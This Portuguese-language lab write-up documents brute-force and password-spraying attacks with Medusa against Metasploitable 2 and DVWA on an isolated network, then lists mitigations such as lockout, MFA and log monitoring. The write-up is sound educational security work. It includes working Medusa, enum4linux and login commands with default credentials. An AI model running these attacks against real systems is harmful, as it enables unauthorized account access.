Auditoria de Segurança com Medusa: 
Simulação de Ataques de Força Bruta
Este projeto documenta a implementação de um laboratório de testes de penetração utilizando Kali Linux e a ferramenta Medusa para auditar serviços em um ambiente vulnerável (Metasploitable 2). O objetivo é demonstrar tecnicamente como ataques de força bruta ocorrem e como mitigá-los.

OBSERVAÇÃO: O objetivo é puramente educacional e de conformidade com práticas de Ethical Hacking.

1. Configuração do Ambiente
Para garantir a segurança do seu host, utilizamos uma rede isolada.
    • Hipervisor: VirtualBox.
    • Atacante: Kali Linux (IP: 192.168.56.101).
    • Alvo: Metasploitable 2 (IP: 192.168.56.102).
    • Rede: Host-Only (VirtualBox) para isolamento total.

2. Enumeração:
Antes do ataque, foi realizada a descoberta de serviços ativos no alvo:
Comando:
Bash
# Verificando serviços ativos no alvo
nmap -sV 192.168.56.102

3. Preparação: Wordlists.
Antes de iniciar o Medusa, foram criadas as listas para o teste:
Comandos:
Bash
# Criando lista de usuários
echo -e "admin\nuser\nmsfadmin\nroot" > users.txt

# Criando lista de senhas 
echo -e "123456\npassword\nmsfadmin\nqwerty\nadmin123" > passwords.txt

4. Execução dos Ataques com Medusa:
O Medusa é uma ferramenta modular e veloz para força bruta em serviços de rede.

A. Força Bruta em FTP (Porta 21):
Utilizou-se o Medusa para testar combinações de usuários e senhas contra o serviço de transferência de arquivos.
Comando: 
Bash
# Testando combinações de usuários e senhas contra o FTP.
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp

# Após o resultado do comando acima testamos as credenciais obtidas utilizando o comando:
ftp 192.168.56.102
# Quando solicitar o usuário e a senha digitamos:
usuário: msfadmin e senha: msfadmin 
# Com isso obtivemos o acesso ao sistema de FTP.

B. Password Spraying em SMB (Porta 445):
O Password Spraying testa uma única senha comum contra vários usuários para evitar o bloqueio de contas. Primeiro, enumeramos usuários via enum4linux, depois utilizamos a nossa lista que será criada após a enumeração.

Comandos: 
Bash
# Enumerando via enum4linux
enum4linux -a 192.168.56.102 | tee enum4linux_out.txt

# Consultando o arquivo enum4linux_out.txt
less enum4linux_out.txt

# Criando a lista de usuários
echo -e “user\nmsfadmin\nservice” > smb_users.txt

# Criando a lista de senhas
echo -e “password\n123456\nWelcome123\nmsfadmin” > senhas_spray.txt

# Testando as listas criadas anteriormente
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

# Após o resultado do comando acima testamos as credenciais obtidas utilizando o comando:
smbclient -L //192.168.56.102 -U msfadmin
# Quando solicitar a senha digitamos: 
msfadmin 
# Com isso obtivemos o acesso ao sistema de SMB.

C. Ataque a Formulário Web (DVWA):
Simulação de ataque contra a interface administrativa do Damn Vulnerable Web Application (DVWA).

Comando: 
Bash
# Criando a lista de usuários
echo -e “admin\nuser\nmsfadmin\nroot” > dvwa_users.txt

# Criando a lista de senhas
echo -e “password\n123456\nqwerty\nmsfadmin” > senhas_dvwa.txt

# Tentando obter as credenciais válidas para o acesso ao painel do DVWA
medusa -h 192.168.56.102 -U dvwa_users.txt -P senhas_dvwa.txt -M http -t 6

# Após o resultado do comando acima testamos as credenciais obtidas, conseguimos sucesso com o usuário (admin) e senha (password), e dessa forma conseguimos ter acesso ao painel do DVWA.

4. Documentação e Validação:
Vetor de Ataque: FTP, SMB, HTTP Form.
Ferramenta: Medusa (-M ftp), Medusa (-M smbnt), Medusa (-M http).
Resultado Esperado: Sucesso: msfadmin:msfadmin, Identificação de conta root, Login no painel administrativo.
Validação: ftp 192.168.56.102, smbclient -L //192.168.56.102, Acesso via navegador Kali.

5. Medidas de Prevenção e Mitigação:
Para proteger ambientes reais contra as técnicas exercitadas:
    • Políticas de Bloqueio (Account Lockout): Implementar mecanismos que bloqueiem o IP ou a conta após 3 a 5 tentativas falhas (ex: fail2ban no Linux).
    • Autenticação Multi-Fator (MFA): Essencial para mitigar password spraying, pois a senha sozinha não garante o acesso.
    • Complexidade de Senha: Exigir caracteres especiais, números e letras maiúsculas para tornar wordlists genéricas inúteis.
    • Desativação de Protocolos Inseguros: Substituir FTP por SFTP/SSH e desativar versões antigas do SMB (v1).
    • Monitoramento de Logs: Configurar alertas para um volume incomum de erros 401 Unauthorized (Web) ou falhas de login SSH/FTP.
